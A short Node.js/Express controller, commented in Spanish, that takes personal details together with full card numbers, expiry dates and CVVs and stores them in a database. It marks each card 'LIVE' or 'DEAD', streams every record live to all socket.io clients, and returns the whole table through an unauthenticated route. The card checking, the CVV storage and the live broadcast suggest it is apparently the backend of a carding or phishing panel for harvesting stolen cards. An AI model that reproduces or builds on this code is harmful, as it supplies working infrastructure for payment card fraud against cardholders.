import pool from '../config/db.js'

export const insertData = async (req, res, io) => {
    try {
        const { user, card_details, transaction } = req.body;

        // Extraer los valores del payload
        const { name, lastname, email, tel } = user;
        const { card, year, month, cvv } = card_details;
        const { attempts, status } = transaction;

        // Convertir 'true'/'false' a 'LIVE'/'DEAD'
        const transactionStatus = status ? 'LIVE' : 'DEAD';

        // Realizar la inserción en la base de datos
        const [result] = await pool.execute(
            `INSERT INTO user_transactions 
            (user_name, user_lastname, user_email, user_tel, card_number, card_year, card_month, card_cvv, transaction_attempts, transaction_status, created_at) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())`,
            [name, lastname, email, tel, card, year, month, cvv, attempts, transactionStatus]
        );

        // Emitir los datos a los clientes conectados
        io.emit('newData', {
            id: result.insertId,
            user: { name, lastname, email, tel },
            card_details: { card, year, month, cvv },
            transaction: { attempts, status: transactionStatus }
        });

        // Responder con éxito
        res.status(200).json({ success: true, message: 'Data inserted successfully' });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Error inserting data' });
    }
}


export const getAllData = async (req, res) => {
    try {
        const [rows] = await pool.execute('SELECT * FROM user_transactions')
        res.status(200).json(rows)
    } catch (error) {
        console.error('Error:', error)
        res.status(500).json({ success: false, message: 'Error fetching data' })
    }
}
